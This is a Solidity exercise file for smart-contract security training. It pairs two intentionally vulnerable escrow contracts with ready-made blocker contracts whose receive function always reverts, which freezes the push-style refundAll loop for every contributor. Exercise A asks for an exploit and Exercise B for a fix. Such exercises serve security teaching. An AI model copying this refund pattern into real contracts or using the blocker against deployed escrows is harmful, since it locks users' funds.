// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
Exercise Type A (write exploit):
A1: Register a contributor that always reverts on refund.
A2: Extend attack to block a batched reward distribution loop.
*/
contract ExerciseA_VulnerableEscrow {
    mapping(address => uint256) public contributions;
    address[] public contributors;

    function contribute() external payable {
        if (contributions[msg.sender] == 0) {
            contributors.push(msg.sender);
        }
        contributions[msg.sender] += msg.value;
    }

    function refundAll() external {
        for (uint256 i = 0; i < contributors.length; i++) {
            address c = contributors[i];
            uint256 amount = contributions[c];
            if (amount == 0) {
                continue;
            }

            (bool ok,) = payable(c).call{value: amount}("");
            require(ok, "refund failed");
            contributions[c] = 0;
        }
    }
}

contract ExerciseA_Blocker {
    function join(ExerciseA_VulnerableEscrow escrow) external payable {
        escrow.contribute{value: msg.value}();
    }

    receive() external payable {
        revert("blocked");
    }
}

/*
Exercise Type B (write fix):
Vulnerable push-refund contract + blocker provided. Patch escrow only.
*/
contract ExerciseB_VulnerableEscrow {
    mapping(address => uint256) public contributions;
    address[] public contributors;

    function contribute() external payable {
        if (contributions[msg.sender] == 0) {
            contributors.push(msg.sender);
        }
        contributions[msg.sender] += msg.value;
    }

    function refundAll() external {
        for (uint256 i = 0; i < contributors.length; i++) {
            address c = contributors[i];
            uint256 amount = contributions[c];
            if (amount == 0) {
                continue;
            }

            (bool ok,) = payable(c).call{value: amount}("");
            require(ok, "refund failed");
            contributions[c] = 0;
        }
    }
}

contract ExerciseB_WorkingBlocker {
    function join(ExerciseB_VulnerableEscrow escrow) external payable {
        escrow.contribute{value: msg.value}();
    }

    receive() external payable {
        revert("blocked");
    }
}
